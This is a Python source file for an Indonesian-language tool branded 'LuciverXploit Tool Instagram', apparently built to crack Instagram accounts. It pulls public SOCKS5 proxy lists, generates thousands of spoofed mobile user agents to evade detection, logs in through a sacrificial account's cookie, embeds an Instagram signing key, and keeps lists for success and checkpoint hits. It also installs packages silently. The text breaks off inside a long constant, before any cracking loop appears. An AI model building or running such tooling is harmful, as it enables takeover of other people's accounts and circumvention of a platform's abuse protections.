# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import stdiomask
	import urllib.request
	import urllib.parse
	import calendar
	import base64,subprocess
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
from rich.progress import track
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.tree import Tree
from rich import print as prints

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
try:
	file_color = open("assets/theme_color","r").read()
	color_rich = file_color.split("|")[0]
	color_table = file_color.split("|")[1]
except:
	color_rich = "[#afafff]"
	color_table = "#00FF00"
sys.stdout.write('\x1b]2; Robet\x07')
try:
	os.mkdir('result')
except:
	pass
try:os.mkdir("assets")
except:pass
SE = "[#9F9F9F]" # ABU
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([H2,K2,B2,U2,N2,O2,J2,A2])
hapus  = '[/]'
zx=[]
try:
	link = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
	open('.prox.txt','w').write(link)
except:pass
try:
	from cleantext import clean
except:
	os.system("pip3 install clean-text")
	os.system("pip3 install Unidecode")
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 269.0.0.18.75 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
HARIS1={}
method=[]
ugen=[]
s=requests.Session()
zx=[]
baru=[]
ncek=[]
til = "robet"
############UA#############
ugen5=[]
def uazku():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8

for xc in range(1000):
    rr = random.randint
    rc = random.choice
    uaz1 = f"Instagram 218.0.0.19.108 Android (30/11; 320dpi; 720x1432; INFINIX MOBILITY LIMITED/Infinix; Infinix X657B; Infinix-X657B; mt6761; in_ID; 345526700)"
    uaz2 = f"Mozilla/5.0 (Linux; Android 11; RMX3195 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} YaBrowser/22.1.0.{str(rr(190,199))} (lite) Mobile Safari/537.36"
    uaz3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2197 Build/SKQ1.{str(rr(211111,299999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,150))} Mobile Safari/537.36 Instagram {str(rr(260,290))}.0.0.{str(rr(20,99))}.{str(rr(320,390))} Android (31/{str(rr(9,12))}; 480dpi; 1080x2158; OPPO; CPH2197; OP4F39L1; qcom; de_DE; {str(rr(422222222,499999999))})"
    uainsta = str(rc([uaz1, uaz2, uaz3]))
    baru.append(uainsta)

for typo in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 13; V2124 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; RMX3636 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]"
    uazku6 = f"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN;PBAM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 Quark/3.8.3.127 Mobile Safari/537.36"
    uazstart = str(rc([uazku1, uazku2, uazku3]))
    baru.append(uazstart)

for NazriXDGantengNgab in range(1000):
   android1 = rc(["3","4","5","6","7","8","9","10","11","12"])
   android2 = rc(["1.5","1.6","2.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.0","8.1.0","4.4.4","5.1","6.3"])
   adtyaxcc = rc(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
   chrome1 = rr(73,99)
   chrome2 = rr(4500,4900)
   chrome3 = rr(75,150)
   chrome4 = rr(111111,199999)
   buildhan = rc([
                  "MMB29P",
                  "MMB29K",
                  "LRX22G",
                  "LMY48B",
                  "JZO54K",
                  "KTU84P",
                  "KOT49H",
                  "JDQ39"])
   deviceku = rc([
                  "Lenovo TB-X104X",
                  "SM-G930VC",
                  "Nexus 6P",
                  "SAMSUNG SM-T550",
                  "HTC Legend 1.32.163.1",
                  "HTC_TATTOO_A3288",
                  "Nexus One",
                  "LG-L1100",
                  "SonyEricssonX10i",
                  "SM-A510F",
                  "SM-T560",
                  "B3-A20",
                  "XT720"])
   ugent1 = f"Mozilla/5.0 (Linux; Android {android1}; SM-R825F Build/QP1A.{chrome4}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36"
   ugent2 = f"Mozilla/5.0 (Linux; U; Android {android2}; {adtyaxcc}; {deviceku} Build/{buildhan}) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
   ugent3 = f"Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.{chrome4}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome1}.0.{chrome2}.{chrome3} Mobile Safari/537.36 OPR/48.2.{chrome2}.133{chrome3}"
   adtyaUAmain = rc([ugent1,ugent2,ugent3])
   ugen.append(adtyaUAmain)
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "CYBER RAL"
	elif 12 <= hours < 15:timenow = "CYBER RAL"
	elif 15 <= hours < 18:timenow = "CYBER RAL"
	else:timenow = "CYBER RAL"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def banner():
	clear()
	au=f"""{M2}
             _______            __                ___ _______ 
           |   _   .----.--.--|  |_.-----.______|   |   _   |
           |.  1   |   _|  |  |   _|  -__|______|.  |.  |___|{P2}
           |.  _   |__| |_____|____|_____|      |.  |.  |   |
           |:  1    \                           |:  |:  1   |
           |::.. .  /                           |::.|::.. . |
           `-------'                            `---`-------'
                       {H2}𝕃𝕦𝕔𝕚𝕧𝕖𝕣𝕏𝕡𝕝𝕠𝕚𝕥 {P2}𝕋𝕠𝕠𝕝 {M2}𝕀𝕟𝕤𝕥𝕒{P2}𝕘𝕣𝕒𝕞  """
	sol().print(nel(au,style=f'{color_table}',width=80,title=f'{K2}×͜× {P2}{waktu()} {K2}×͜×'))
def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Verifikasi Lisensi...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus
def li():
    clear()
    up=f"""[green]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                            [/green]"""
    ui=nel(up,style='green')
    sol().print(ui)	
def lu():
	clear()
	up=f"""[red]
██╗░░░░░██╗░█████╗░███████╗███╗░░██╗░██████╗███████╗
██║░░░░░██║██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝
██║░░░░░██║██║░░╚═╝█████╗░░██╔██╗██║╚█████╗░█████╗░░
██║░░░░░██║██║░░██╗██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░
███████╗██║╚█████╔╝███████╗██║░╚███║██████╔╝███████╗
╚══════╝╚═╝░╚════╝░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝                                                                                                                                   [/red]
"""
	sol().print(nel(up, style=''))
def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='• Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user
def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            prints(Panel(f'\t           {P2}Login menggunakan cookie instagram[/]',padding=(0,2),style=f"{color_table}"))
            coki = input(f"• Masukan Cookie : {H}")
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] cookie kamu valid", padding=(0,5), style=f"{color_table}", width=80));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] Jalankan ulang perintah nya")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(4)
                exit(f'{M} [x] Login gagal silahkan cek akun tumbal anda');time.sleep(8)
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:register_device()
def login():
	global external
	try:
		wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		us=input(f"{N}[•] Masukan username: {N}")
		pw=stdiomask.getpass(prompt=f'{N}[•] Masukan password: {N}')
	except KeyboardInterrupt:
		wel = '# KeyboardInterrupt terdeteksi... keluar !'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		exit()
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print(f'\n{H}>{C} Login berhasil')
		os.system('python run.py')
	elif x.get('status')=='checkpoint':
		wel = '# Login checkpoint'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
	else:
		wel = '# Username atau password yang anda masukan salah'
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'X104','ColorTab 816i','NG3128HD'
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus','Lenovo']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (28/9; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; Redmi Note 8; '+random.choice(model_phone)+'; ginkgo; qcom; ru_RU'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100','SM-G935T']
	dpis = ['120', '160', '320', '240','560']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; qcom; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_con